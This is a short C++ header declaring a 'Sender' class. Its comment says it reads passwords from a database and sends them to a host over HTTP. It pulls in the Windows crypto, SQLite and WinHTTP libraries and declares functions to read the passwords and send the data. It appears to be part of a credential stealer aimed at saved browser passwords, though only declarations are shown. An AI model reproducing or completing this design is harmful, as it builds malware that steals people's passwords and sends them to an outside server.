#pragma once
#include <iostream>
#include <windows.h>
#include <string>
#include <wincrypt.h>
#include <winsqlite/winsqlite3.h>
#include <WinHttp.h>
#pragma comment(lib, "Winhttp")

using namespace std;
//read passwords from database and to host via http
class Sender
{
private:
	static string url;
	static HINTERNET hConnect;
	static int sqlCallback(void* notUsed, int argc, char** argv, char** azColName);
	static int sendData(string url, string username, string passwords);
	static void readPasswords(string dbPath);
public:
	static void sendPasswords(string dbPath);
};